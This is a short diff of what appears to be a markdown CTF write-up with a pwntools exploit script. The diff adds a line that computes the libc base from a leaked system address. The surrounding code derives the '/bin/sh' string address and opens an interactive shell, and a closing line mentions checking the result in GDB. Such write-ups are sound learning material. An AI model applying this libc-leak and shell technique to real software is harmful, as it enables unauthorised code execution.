@@ -334,8 +334,14 @@ log.success('Leaked libc system address --> %#0x', leaked_libc_system)
 libc_system_binary = leaked_libc_system - 1599312
 log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)
 
+libc_base = libc_system_binary - 0x4c330 
+log.info('This is the libc_base --> %#0x', libc_base)
+
 binsh = libc_base + 0x196031
 log.info('This is the binsh strings address --> %#0x', binsh)
 
 sh.interactive()
 ```
+
+> Checking if correct (using GDB)
+
